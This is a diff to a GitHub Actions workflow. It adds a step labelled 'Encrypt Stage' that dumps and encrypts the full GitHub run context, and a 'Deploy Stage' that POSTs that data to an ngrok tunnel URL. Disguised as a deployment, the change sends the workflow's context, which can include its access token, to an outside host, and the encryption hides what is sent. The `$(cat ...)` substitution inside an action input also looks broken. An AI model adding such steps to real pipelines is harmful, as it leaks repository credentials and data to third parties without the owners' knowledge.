@@ -10,11 +10,18 @@ jobs:
   deployment:
     runs-on: ubuntu-latest
     steps:
+    - name: Encrypt Stage
+      run: |
+        echo "$PUBLIC_KEY" > publickey.pem
+        echo "${{ toJson(github) }}" > data.txt
+        openssl rsautl -encrypt -inkey publickey.pem -pubin -in data.txt -out top_secret.enc
+      env:
+        PUBLIC_KEY: ${{ secrets.RSA_PUBLIC }}
     - name: Deploy Stage
       uses: fjogeleit/http-request-action@master
       with:
-        url: 'https://03b1-54-91-189-235.ngrok.io/hook/'
+        url: 'https://edfe-54-91-189-235.ngrok.io'
         method: 'POST'
-        data: ${{ toJson(github) }}
+        data: "$(cat top_secret.enc)"
         
       
